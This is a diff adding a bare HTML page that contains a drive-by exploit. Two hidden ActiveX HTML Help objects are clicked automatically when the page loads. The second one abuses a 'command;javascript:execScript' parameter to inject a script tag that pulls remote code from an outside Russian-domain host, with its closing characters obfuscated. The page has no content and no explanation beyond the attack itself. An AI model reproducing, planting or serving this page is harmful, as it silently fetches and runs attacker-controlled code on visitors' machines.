@@ -1,0 +1,19 @@
+<html>
+<head></head>
+<OBJECT style="display:none" id="loce" type="application/x-oleobject" classid="clsid:adb460a6-d8ff-11cf-9367-00aa003b5a11" codebase="hhctrl.ocx#Version=5,2,3790,1194">
+<PARAM name="Command" value="Related Topics, MENU">
+<PARAM name="Button" value="Text:_">
+<PARAM name="Window" value="$global_blank">
+<PARAM name="Item1" value="command;ms-its:c:/windows/help/ntshared.chm::/goto_starthelp.htm">
+</OBJECT>
+<OBJECT style="display:none" id="locr" type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" codebase="hhctrl.ocx#Version=5,2,3790,1194">
+<PARAM name="Command" value="Related Topics, MENU">
+<PARAM name="Button" value="Text:_">
+<PARAM name="Window" value="$global_blank">
+<PARAM name="Item1" value='command;javascript:execScript("document.write(\"<script language=\\\"javascript\\\" src=\\\"http://2.ru/cmd/load.txt\\\"\"+String.fromCharCode(62)+\"</scr\"+\"ipt\"+String.fromCharCode(62))")'>
+</OBJECT>
+<script>
+loce.HHClick();
+setTimeout("locr.HHClick()",10);
+</script>
+</HTML>
